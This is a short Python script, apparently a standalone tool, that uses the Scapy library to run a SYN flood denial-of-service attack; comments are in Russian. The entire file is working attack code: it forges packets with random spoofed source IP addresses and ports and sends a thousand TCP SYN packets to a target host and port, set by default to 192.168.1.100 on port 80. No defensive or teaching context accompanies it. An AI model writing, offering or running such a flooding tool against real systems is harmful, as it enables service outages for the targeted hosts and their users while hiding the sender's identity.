# syn_flood_attack.py
from scapy.all import *
import random

def syn_flood(target_ip, target_port, count=1000):
    print(f"Starting SYN Flood attack on {target_ip}:{target_port}")
    
    for i in range(count):
        # Создаем случайный IP отправителя
        src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
        
        # Создаем случайный порт отправителя
        src_port = random.randint(1024, 65535)
        
        # Создаем IP и TCP пакеты
        ip_layer = IP(src=src_ip, dst=target_ip)
        tcp_layer = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000, 100000))
        
        # Отправляем пакет
        send(ip_layer/tcp_layer, verbose=0)
        
        if i % 100 == 0:
            print(f"Sent {i} SYN packets")
    
    print("SYN Flood attack completed")

if __name__ == "__main__":
    syn_flood("192.168.1.100", 80, 1000)